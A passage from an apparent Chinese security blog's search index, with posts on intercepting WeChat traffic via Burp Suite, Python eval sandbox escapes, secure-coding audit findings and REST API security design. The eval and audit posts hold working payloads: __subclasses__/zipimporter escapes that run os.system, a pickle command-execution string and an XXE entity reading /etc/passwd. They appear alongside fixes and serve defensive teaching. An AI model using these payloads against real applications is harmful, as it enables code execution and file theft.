parent.callbacks.issueAlert(“payloadPlain:” + payloadPlain); try { Map map = JSON.parseObject(this.value, new TypeReference]]></content>
      <categories>
        <category>Burp</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
        <tag>extention</tag>
        <tag>插件</tag>
        <tag>RSA</tag>
        <tag>加解密</tag>
        <tag>encryption</tag>
        <tag>decryption</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何让Burpsuite监听微信公众号]]></title>
    <url>%2F2016%2F02%2F01%2F%E5%A6%82%E4%BD%95%E8%AE%A9Burpsuite%E7%9B%91%E5%90%AC%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%2F</url>
    <content type="text"><![CDATA[1 目的通过burpsuite代理截获微信公众号的https流量包，做一些重放和自动扫描。这个公众号会利用微信的认证体系，认证完之后就会到他本身的服务器，用户再通过微信内置浏览器的cookie或者其他认证机制交互，当然这些认证数据基本上无法获取，同时这个公众号在微信端也没有转发，在浏览器中打开等普通微信公众号常见功能。 2 模拟器+微信由于模拟器的便捷性，第一个就会被想到，于是在4.0.3的模拟器上装上了最新版的微信，运行就退出。既然最高版本都已经禁止了模拟器，就想着微信的历史版本，装了30，35，40，45，50等版本，都是运行一会就提示升级，并且是不让用，难道我要逆向微信的代码，这个代价有点大，搜搜才知道原来微信已经禁止在模拟器上使用了，后来看到了有人出了解决方案，就是先root，然后装xposed框架，然后在其上装XPrivacy，过程复杂，详情见链接，这种方法我没有接着试下去。 3 真机+微信模拟器已经被禁用，只能拿出自己的手机来试验了。 3.1 wifi 环境由于是台式机，直接使用的随身wifi，如果是笔记本，可以直接将本设置为wifi热点。 3.2 代理设置首先是burpsuite的代理设置，见下图，图中ip则是我的真实机的ip，绑定的端口则可以任意设置，不冲突即可，我这里设置成8080端口。设置完burpsuite则是手机上wifi的代理设置，先连接到wifi热点，长按链接处，选“修改网络”，勾选“显示高级选项”，代理设置那里改成“手动”，就可以填写HTTP代理的主机和端口，在这里我们设置成第二步中burpsuite设置的ip地址和端口地址。 3.3 证书安装这样设置完之后基本上就可以抓包了，如果是https的请求，每次都会提示证书问题，很烦人也影响效率，所以我们要安装burpsuite的证书，由于前面设置好了代理，通过手机浏览器访问http://burp，就能看到有证书下载，下载完之后，通过手机的设置，安全，再到证书安装，安装完证书即可。 这样设置之后，手机上的大部分http和https数据包都能截获了，微信的数据包也能截获了，只是都是加密的，根本不知道是啥，要被测试的公众号呢？每次打开都是白屏，啥提示都没有，burpsuite上无流量显示，通过wireshark抓包，也仅仅是一些到腾讯服务器的tcp流量，难道微信还能自动检测代理存在，自动根据公众号的安全级别来绑定，安全级别高则不发送相应流量，仅仅是猜测。 上述方式行不通，想到了第三种 4 微信windows客户端微信在windows端也提供了相应的版本，相对于手机android版本，功能较弱，当然一些安全策略也有变化。（1）修改windows hosts的配置文件，路径(C:\Windows\System32\drivers\etc\hosts)，具体的配置如下：127.0.0.1 test.com （2）burpsuite代理的设置 按照如上图示设置之后，微信客户端发送到test.com的流量就直接转发给本地127.0.0.1:9080端口，这样burpsuite就能捕获到了，接着burpsuite将该包转发到test.com对应的ip的端口上就完成了一次请求捕获转发的过程。注意事项：support invible proxying 必须开启，否则看不到流量。request handling中redirect to host 必须设置成具体的ip,也就是test.com对应的ip，否则会导致包死循环在本地转发。 在burpsuite中如果设置成test.com会报如下错误1This request to Burp&apos;s web interface used a fully-qualified DNS name in the Host header. The request was blocked to prevent DNS rebinding attacks. You can enable support for fully-qualified DNS names in Burp&apos;s web interface at Proxy / Options / Miscellaneous. 接着按照如上设置之后，将如下选项打勾之后则会报后续错误，解决方法就是直接设置成ip和端口Invalid client request received: Dropped request looping back to same Proxy listener.在此我们就完成了微信流量的监测。 微信windows客户端的好处就是方便测试，另外能够打开在微信 android客户端无法获取链接的问题，目前在1.5.0.33好用，估计过段时间也会被微信封了。]]></content>
      <categories>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>Burpsuite</tag>
        <tag>微信公众号</tag>
        <tag>监听</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python eval的常见错误封装及利用原理]]></title>
    <url>%2F2015%2F07%2F31%2FPython%20eval%E7%9A%84%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF%E5%B0%81%E8%A3%85%E5%8F%8A%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[最近在代码评审的过程，发现挺多错误使用eval导致代码注入的问题，比较典型的就是把eval当解析dict使用，有的就是简单的使用eval，有的就是错误的封装了eval，供全产品使用，这引出的问题更严重，这些都是血淋淋的教训，大家使用的时候多加注意。下面列举一个实际产品中的例子，详情见[bug83055][1]： def remove(request, obj)： query = query2dict(request.POST) eval(query[&apos;oper_type&apos;])(query, customer_obj) 而query就是POST直接转换而来，是用户可直接控制的，假如用户在url参数中输入oper_type=__import__(&#39;os&#39;).system(&#39;sleep 5&#39;) 则可以执行命令sleep，当然也可以执行任意系统命令或者任意可执行代码，危害是显而易见的，那我们来看看eval到底是做什么的，以及如何做才安全？ 1，做什么简单来说就是执行一段表达式 &gt;&gt;&gt; eval(&apos;2+2&apos;) 4 &gt;&gt;&gt; eval(&quot;&quot;&quot;{&apos;name&apos;:&apos;xiaoming&apos;,&apos;ip&apos;:&apos;10.10.10.10&apos;}&quot;&quot;&quot;) {&apos;ip&apos;: &apos;10.10.10.10&apos;, &apos;name&apos;: &apos;xiaoming&apos;} &gt;&gt;&gt; eval(&quot;__import__(&apos;os&apos;).system(&apos;uname&apos;)&quot;, {}) Linux 0 从这三段代码来看，第一个很明显做计算用，第二个把string类型数据转换成python的数据类型，这里是dict，这也是咱们产品中常犯的错误。第三个就是坏小子会这么干，执行系统命令。eval 可接受三个参数，eval(source[, globals[, locals]]) -&gt; valueglobals必须是路径，locals则必须是键值对，默认取系统globals和locals 2，不正确的封装（1）下面我们来看一段咱们某个产品代码中的封装函数，见[bug][2]，或者网络上搜索排名比较高的代码，eg： def safe_eval(eval_str): try: #加入命名空间 safe_dict = {} safe_dict[&apos;True&apos;] = True safe_dict[&apos;False&apos;] = False return eval(eval_str,{&apos;__builtins__&apos;:None},safe_dict) except Exception,e: traceback.print_exc() return &apos;&apos; 在这里__builtins__置为空了，所以像__import__这是内置变量就没有了，这个封装函数就安全了吗？下面我一步步道来： &gt;&gt;&gt; dir(__builtins__) [&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, 列表项 ‘UnicodeEncodeError’, ‘UnicodeError’, ‘UnicodeTranslateError’, ‘UnicodeWarning’, ‘UserWarning’, ‘ValueError’, ‘Warning’, ‘ZeroDivisionError’, ‘_’, ‘debug‘, ‘doc‘, ‘import‘, ‘name‘, ‘package‘, ‘abs’, ‘all’, ‘any’, ‘apply’, ‘basestring’, ‘bin’, ‘bool’, ‘buffer’, ‘bytearray’, ‘bytes’, ‘callable’, ‘chr’, ‘classmethod’, ‘cmp’, ‘coerce’, ‘compile’, ‘complex’, ‘copyright’, ‘credits’, ‘delattr’, ‘dict’, ‘dir’, ‘divmod’, ‘enumerate’, ‘eval’, ‘execfile’, ‘exit’, ‘file’, ‘filter’, ‘float’, ‘format’, ‘frozenset’, ‘getattr’, ‘globals’, ‘hasattr’, ‘hash’, ‘help’, ‘hex’, ‘id’, ‘input’, ‘int’, ‘intern’, ‘isinstance’, ‘issubclass’, ‘iter’, ‘len’, ‘license’, ‘list’, ‘locals’, ‘long’, ‘map’, ‘max’, ‘memoryview’, ‘min’, ‘next’, ‘object’, ‘oct’, ‘open’, ‘ord’, ‘pow’, ‘print’, ‘property’, ‘quit’, ‘range’, ‘raw_input’, ‘reduce’, ‘reload’, ‘repr’, ‘reversed’, ‘round’, ‘set’, ‘setattr’, ‘slice’, ‘sorted’, ‘staticmethod’, ‘str’, ‘sum’, ‘super’, ‘tuple’, ‘type’, ‘unichr’, ‘unicode’, ‘vars’, ‘xrange’, ‘zip’] 从__builtins__可以看到其模块中有__import__,可以借助用来执行os的一些操作。如果置为空，再去执行eval函数呢，结果如下： &gt;&gt;&gt; eval(&quot;__import__(&apos;os&apos;).system(&apos;uname&apos;)&quot;, {&apos;__builtins__&apos;:{}}) Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt; NameError: name &apos;__import__&apos; is not defined 现在就是提示__import__未定义，不能成功执行了，看情况是安全了吧？答案当然是错的。比如执行如下： &gt;&gt;&gt; s = &quot;&quot;&quot; ... (lambda fc=( ... lambda n: [ ... c for c in ... ().__class__.__bases__[0].__subclasses__() ... if c.__name__ == n ... ][0] ... ): ... fc(&quot;function&quot;)( ... fc(&quot;code&quot;)( ... 0,0,0,0,&quot;test&quot;,(),(),(),&quot;&quot;,&quot;&quot;,0,&quot;&quot; ... ),{} ... )() ... )() ... &quot;&quot;&quot; &gt;&gt;&gt; eval(s, {&apos;__builtins__&apos;:{}}) Segmentation fault (core dumped) 在这里用户定义了一段函数，这个函数调用，直接导致段错误下面这段代码则是退出解释器： &gt;&gt;&gt; &gt;&gt;&gt; s = &quot;&quot;&quot; ... [ ... c for c in ... ().__class__.__bases__[0].__subclasses__() ... if c.__name__ == &quot;Quitter&quot; ... ][0](0)() ... &quot;&quot;&quot; &gt;&gt;&gt; eval(s,{&apos;__builtins__&apos;:{}}) liaoxinxi@RCM-RSAS-V6-Dev ~/tools/auto_judge $ 初步理解一下整个过程： &gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__() [&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;Struct&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;class &apos;configobj.InterpolationEngine&apos;&gt;, &lt;class &apos;configobj.SimpleVal&apos;&gt;, &lt;class &apos;configobj.InterpolationEngine&apos;&gt;, &lt;class &apos;configobj.SimpleVal&apos;&gt;] 这句python代码的意思就是找tuple的class，再找它的基类，也就是object，再通过object找他的子类，具体的子类也如代码中的输出一样。从中可以看到了有file模块，zipimporter模块，是不是可以利用下呢？首先从file入手假如用户如果构造： &gt;&gt;&gt; s1 = &quot;&quot;&quot; ... [ ... c for c in ... ().__class__.__bases__[0].__subclasses__() ... if c.__name__ == &quot;file&quot; ... ][0](&quot;/etc/passwd&quot;).read()() ... &quot;&quot;&quot; &gt;&gt;&gt; eval(s1,{&apos;__builtins__&apos;:{}}) Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; File &quot;&lt;string&gt;&quot;, line 6, in &lt;module&gt; IOError: file() constructor not accessible in restricted mode 这个restrictected mode简单理解就是python解释器的沙盒，一些功能被限制了，比如说不能修改系统，不能使用一些系统函数，如file，详情见Restricted Execution Mode，那怎么去绕过呢？这时我们就想到了zipimporter了，假如引入的模块中引用了os模块，我们就可以像如下代码来利用。 &gt;&gt;&gt; s2=&quot;&quot;&quot; ... [x for x in ().__class__.__bases__[0].__subclasses__() ... if x.__name__ == &quot;zipimporter&quot;][0]( ... &quot;/home/liaoxinxi/eval_test/configobj-4.4.0-py2.5.egg&quot;).load_module( ... &quot;configobj&quot;).os.system(&quot;uname&quot;) ... &quot;&quot;&quot; &gt;&gt;&gt; eval(s2,{&apos;__builtins__&apos;:{}}) Linux 0 这就验证了刚才的safe_eval其实是不安全的。 3，如何正确使用（1）使用ast.literal_eval（2）如果仅仅是将字符转为dict，可以使用json格式]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>eval</tag>
        <tag>sandbox escape</tag>
        <tag>沙箱绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python安全编码和代码审计]]></title>
    <url>%2F2015%2F07%2F30%2FPython%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E5%92%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[1 前言现在一般的web开发框架安全已经做的挺好的了，比如大家常用的django，但是一些不规范的开发方式还是会导致一些常用的安全问题，下面就针对这些常用问题做一些总结。代码审计准备部分见《php代码审计》，这篇文档主要讲述各种常用错误场景，基本上都是咱们自己的开发人员犯的错误，敏感信息已经去除。 2 XSS未对输入和输出做过滤，场景：123def xss_test(request): name = request.GET['name'] return HttpResponse('hello %s' %(name)) 在代码中一搜，发现有大量地方使用，比较正确的使用方式如下：1234def xss_test(request): name = request.GET['name'] #return HttpResponse('hello %s' %(name)) return render_to_response('hello.html', &#123;'name':name&#125;) 更好的就是对输入做限制，比如说一个正则范围，输出使用正确的api或者做好过滤。 3 CSRF对系统中一些重要的操作要做CSRF防护，比如登录，关机，扫描等。django 提供CSRF中间件django.middleware.csrf.CsrfViewMiddleware,写入到settings.py的中间件即可。12345def my_view(request): c = &#123;&#125; c.update(csrf(request)) # ... view code here return render_to_response("a_template.html", c) 4 命令注入审计代码过程中发现了一些编写代码的不好的习惯，体现最严重的就是在命令注入方面，本来python自身的一些函数库就能完成的功能，偏偏要调用os.system来通过shell 命令执行来完成，老实说最烦这种写代码的啦。下面举个简单的例子：123456 def myserve(request, filename, dirname): re = serve(request=request,path=filename,document_root=dirname,show_indexes=True) filestr='authExport.dat' re['Content-Disposition'] = 'attachment; filename="' + urlquote(filestr) +'"'fullname=os.path.join(dirname,filename) os.system('sudo rm -f %s'%fullname) return re 很显然这段代码是存在问题的，因为fullname是用户可控的。正确的做法是不使用os.system接口，改成python自有的库函数，这样就能避免命令注入。python的三种删除文件方式：（1）shutil.rmtree 删除一个文件夹及所有文件（2）os.rmdir 删除一个空目录（3）os.remove，unlink 删除一个文件 使用了上述接口之后还得注意不能穿越目录，不然整个系统都有可能被删除了。常见的存在命令执行风险的函数如下：1os.system,os.popen,os.spaw*,os.exec*,os.open,os.popen*,commands.call,commands.getoutput,Popen* 推荐使用subprocess模块，同时确保shell=True未设置，否则也是存在注入风险的。 5 sql注入如果是使用django的api去操作数据库就应该不会有sql注入了，但是因为一些其他原因使用了拼接sql，就会有sql注入风险。下面贴一个有注入风险的例子：123456789101112131415161718192021222324252627282930313233343536373839404142def getUsers(user_id=None): conn = psycopg2.connect("dbname='××' user='××' host='' password=''") cur = conn.cursor(cursor_factory=psycopg2.extras.DictCursor) if user_id==None: str = 'select distinct * from auth_user' else: str='select distinct * from auth_user where id=%s'%user_id res = cur.execute(str) res = cur.fetchall() conn.close() return res``` 像这种sql拼接就有sql注入问题，正常情况下应该使用django的数据库api，如果实在有这方面的需求，可以按照如下方式写： ```pythondef user_contacts(request): user = request.GET['username'] sql = "SELECT * FROM user_contacts WHERE username = %s" cursor = connection.cursor() cursor.execute(sql, [user])# do something with the results results = cursor.fetchone() #or results = cursor.fetchall() cursor.close()``` 直接拼接的是万万不可的，如果采用ModelInstance.objects.raw(sql,[]),或者connection.objects.execute(sql,[]) ,通过列表传进去的参数是没有注入风险的，因为django会有处理。# 6 代码执行 一般是由于eval和pickle.loads的滥用造成的，特别是eval，大家都没有意识到这方面的问题。下面举个代码中的例子：```python@login_required@permission_required("accounts.newTask_assess")def targetLogin(request): req = simplejson.loads(request.POST['loginarray']) req=unicode(req).encode("utf-8") loginarray=eval(req) ip=_e(request,'ipList') #targets=base64.b64decode(targets) (iplist1,iplist2)=getIPTwoList(ip) iplist1=list(set(iplist1)) iplist2=list(set(iplist2)) loginlist=[] delobjs=[] holdobjs=[] 这一段代码就是就是因为eval的参数不可控，导致任意代码执行，正确的做法就是literal.eval接口。再取个pickle.loads的例子：1234&gt;&gt;&gt; import cPickle&gt;&gt;&gt; cPickle.loads("cos\nsystem\n(S'uname -a'\ntR.")Linux RCM-RSAS-V6-Dev 3.9.0-aurora #4 SMP PREEMPT Fri Jun 7 14:50:52 CST 2013 i686 Intel(R) Core(TM) i7-2600 CPU @ 3.40GHz GenuineIntel GNU/Linux0 7 文件操作文件操作主要包含任意文件下载，删除，写入，覆盖等，如果能达到写入的目的时基本上就能写一个webshell了。下面举个任意文件下载的例子：123456789@login_required@permission_required("accounts.newTask_assess")def exportLoginCheck(request,filename): if re.match(r“*.lic”，filename): fullname = filename else: fullname = "/tmp/test.lic" print fullname return HttpResponse(fullname) 这段代码就存在着任意.lic文件下载的问题，没有做好限制目录穿越，同理 8 文件上传8.1 任意文件上传这里主要是未限制文件大小，可能导致ddos，未限制文件后缀，导致任意文件上传，未给文件重命名，可能导致目录穿越，文件覆盖等问题。 8.2 xml，excel等上传在我们的产品中经常用到xml来保存一些配置文件，同时也支持xml文件的导出导入，这样在libxml2.9以下就可能导致xxe漏洞。就拿lxml来说吧：123456789101112131415161718root@kali:~/python# cat test.xml&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE xdsec [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;root&gt; &lt;node id="11" name="bb" net="192.168.0.2-192.168.0.37" ltd="" gid="" /&gt;test&amp;xxe;&lt;/root&gt;&gt;&gt;&gt; from lxml import etree&gt;&gt;&gt; tree1 = etree.parse('test.xml')&gt;&gt;&gt; print etree.tostring(tree1.getroot())&lt;root&gt; &lt;node id="11" name="bb" net="192.168.0.2-192.168.0.37" ltd="" gid=""/&gt;testroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/sh 这是因为在lxml中默认采用的XMLParser导致的：12class XMLParser(_FeedParser)| XMLParser(self, encoding=None, attribute_defaults=False, dtd_validation=False, load_dtd=False, no_network=True, ns_clean=False, recover=False, XMLSchema schema=None, remove_blank_text=False, resolve_entities=True, remove_comments=False, remove_pis=False, strip_cdata=True, target=None, compact=True) 关注其中两个关键参数，其中resolve_entities=True,no_network=True,其中resolve_entities=True会导致解析实体，no_network会为True就导致了该利用条件比较有效，会导致一些ssrf问题，不能将数据带出。在python中xml.dom.minidom,xml.etree.ElementTree不受影响 9 不安全的封装9.1 eval 封装不彻底仅仅是将__builtings__置为空，如下方式即可绕过,可参见bug84179 &gt;&gt;&gt; s2=""" ... [x for x in ().__class__.__bases__[0].__subclasses__() ... if x.__name__ == "zipimporter"][0]( ... "/home/xxlegend/eval_test/configobj-4.4.0-py2.5.egg").load_module( ... "configobj").os.system("uname") ... """ &gt;&gt;&gt; eval(s2,{'__builtins__':{}}) Linux 0 9.2 执行命令接口封装不彻底在底层封装函数没有过滤shell元字符，仅仅是限定一些命令，但是其参数未做控制，可参见bug86011 10 总结一切输入都是不可靠的，做好严格过滤。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>安全编码</tag>
        <tag>python</tag>
        <tag>代码审计</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[REST API安全设计指南]]></title>
    <url>%2F2015%2F04%2F01%2FREST%20API%20%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[1，REST API 简介REST的全称是REpresentational State Transfer，表示表述性无状态传输，无需session，所以每次请求都得带上身份认证信息。rest是基于http协议的，也是无状态的。只是一种架构方式，所以它的安全特性都需我们自己实现，没有现成的。建议所有的请求都通过https协议发送。RESTful web services 概念的核心就是“资源”。 资源可以用 URI 来表示。客户端使用 HTTP 协议定义的方法来发送请求到这些 URIs，当然可能会导致这些被访问的”资源“状态的改变。HTTP请求对应关系如下：123456789========== ===================== ========================HTTP 方法 行为 示例========== ===================== ========================GET 获取资源的信息 http://xx.com/api/ordersGET 获取某个特定资源的信息 http://xx.com/api/orders/123POST 创建新资源 http://xx.com/api/ordersPUT 更新资源 http://xx.com/api/orders/123DELETE 删除资源 http://xx.com/api/orders/123========== ====================== ======================= 对于请求的数据一般用json或者xml形式来表示，推荐使用json。 2，身份认证身份认证包含很多种，有HTTP Basic，HTTP Digest，API KEY，Oauth，JWK等方式，下面简单讲解下： ##2.1 HTTP BasicREST由于是无状态的传输，所以每一次请求都得带上身份认证信息，身份认证的方式，身份认证的方式有很多种，第一种便是http basic，这种方式在客户端要求简单，在服务端实现也非常简单，只需简单配置apache等web服务器即可实现，所以对于简单的服务来说还是挺方便的。但是这种方式安全性较低，就是简单的将用户名和密码base64编码放到header中。123base64编码前：Basic admin:adminbase64编码后：Basic YWRtaW46YWRtaW4=放到Header中：Authorization: Basic YWRtaW46YWRtaW4= 正是因为是简单的base64编码存储，切记切记在这种方式下一定得注意使用ssl，不然就是裸奔了。在某些产品中也是基于这种类似方式，只是没有使用apache的basic机制，而是自己写了认证框架，原理还是一样的，在一次请求中base64解码Authorization字段，再和认证信息做校验。很显然这种方式有问题，认证信息相当于明文传输，另外也没有防暴力破解功能。 ##2.2 API KEYAPI Key就是经过用户身份认证之后服务端给客户端分配一个API Key，类似：http://example.com/api?key=dfkaj134,一般的处理流程如下：一个简单的设计示例如下：client端： server端： client端向服务端注册，服务端给客户端发送响应的api_key以及security_key，注意保存不要泄露，然后客户端根据api_key,secrity_key,timestrap,rest_uri采用hmacsha256算法得到一个hash值sign，构造途中的url发送给服务端。服务端收到该请求后，首先验证api_key,是否存在，存在则获取该api_key的security_key，接着验证timestrap是否超过时间限制，可依据系统成而定，这样就防止了部分重放攻击，途中的rest_api是从url获取的为/rest/v1/interface/eth0,最后计算sign值，完之后和url中的sign值做校验。这样的设计就防止了数据被篡改。通过这种API Key的设计方式加了时间戳防止了部分重放，加了校验，防止了数据被篡改，同时避免了传输用户名和密码，当然了也会有一定的开销。 2.3 Oauth1.0a或者Oauth2OAuth协议适用于为外部应用授权访问本站资源的情况。其中的加密机制与HTTP Digest身份认证相比，安全性更高。使用和配置都比较复杂，这里就不涉及了。 2.4 JWTJWT 是JSON Web Token，用于发送可通过数字签名和认证的东西，它包含一个紧凑的，URL安全的JSON对象，服务端可通过解析该值来验证是否有操作权限，是否过期等安全性检查。由于其紧凑的特点，可放在url中或者 HTTP Authorization头中，具体的算法就如下图 3 授权身份认证之后就是授权，根据不同的身份，授予不同的访问权限。比如admin用户，普通用户，auditor用户都是不同的身份。简单的示例：12345678910$roles = array('ADMIN'=&gt;array('permit'=&gt;array('/^((\/system\/(clouds|device)$/'), // 允许访问哪些URL的正则表达式'deny'=&gt;array('/^(\/system\/audit)$/') // 禁止访问哪些URL的正则表达式),'AUDIT'=&gt;array('permit'=&gt;array('/^(\/system\/audit)$/'),//允许访问的URL正则表达式'deny'=&gt;array('/^((\/system\/(clouds|device).*)$/'))); 上述是垂直权限的处理，如果遇到了平行权限的问题，如用户A获取用户B的身份信息或者更改其他用户信息，对于这些敏感数据接口都需要加上对用户的判断，这一步一般都在具体的逻辑实现中实现。 4 URL过滤在进入逻辑处理之前，加入对URL的参数过滤，如/site/{num}/policy 限定num位置为整数等，如果不是参数则直接返回非法参数，设定一个url清单，不在不在url清单中的请求直接拒绝，这样能防止开发中的api泄露。rest api接口一般会用到GET,POST,PUT,DELETE,未实现的方法则直接返回方法不允许，对于POST，PUT方法的数据采用json格式，并且在进入逻辑前验证是否json，不合法返回json格式错误。 5 重要功能加密传输第一步推荐SSL加密传输，同时对于系统中重要的功能做加密传输，如证书，一些数据，配置的备份功能，同时还得确保具备相应的权限，这一步会在授权中涉及。 6 速率限制请求速率限制，根据api_key或者用户来判断某段时间的请求次数，将该数据更新到内存数据库（redis，memcached），达到最大数即不接受该用户的请求，同时这样还可以利用到内存数据库key在特定时间自动过期的特性。在php中可以使用APC，Alternative PHP Cache (APC) 是一个开放自由的PHP opcode 缓存。它的目标是提供一个自由、 开放，和健全的框架用于缓存和优化PHP的中间代码。在返回时设置X-Rate-Limit-Reset:当前时间段剩余秒数，APC的示例代码如下：12345678910111213Route::filter('api.limit', function()&#123;$key = sprintf('api:%s', Auth::user()-&gt;api_key);// Create the key if it doesn't existCache::add($key, 0, 60);// Increment by 1$count = Cache::increment($key);// Fail if hourly requests exceededif ($count &gt; Config::get('api.requests_per_hour'))&#123;App::abort(403, 'Hourly request limit exceeded');&#125;&#125;); 7 错误处理对于非法的，导致系统出错的等请求都进行记录，一些重要的操作，如登录，注册等都通过日志接口输出展示。有一个统一的出错接口，对于400系列和500系列的错误都有相应的错误码和相关消息提示，如401：未授权；403：已经鉴权，但是没有相应权限。如不识别的url:{&quot;result&quot;:&quot;Invalid URL!&quot;},错误的请求参数{&quot;result&quot;:&quot;json format error&quot;},不允许的方法：{&quot;result&quot;:&quot;Method Not Allowed&quot;}，非法参数等。上面所说的都是单状态码，同时还有多状态码，表示部分成功，部分字符非法等。示例如下：12345678910111213141516171819202122HTTP/1.1 207 Multi-StatusContent-Type: application/json; charset=&quot;UTF-8&quot;Content-Length: XXXX&#123;&quot;OPT_STATUS&quot;: 207&quot;DATA&quot;: &#123; &quot;IP_ADDRESS&quot;: [&#123; &quot;INTERFACE&quot;: &quot;eth0&quot;, &quot;IP_LIST&quot;:[&#123; &quot;IP&quot;: &quot;192.168.1.1&quot;, &quot;MASK&quot;: &quot;255.255.0.0&quot;,&quot;MULTI_STATUS&quot;: 200, &quot;MULTI_RESULT&quot;: &quot;created successfully&quot; &#125;,&#123; &quot;IP&quot;: 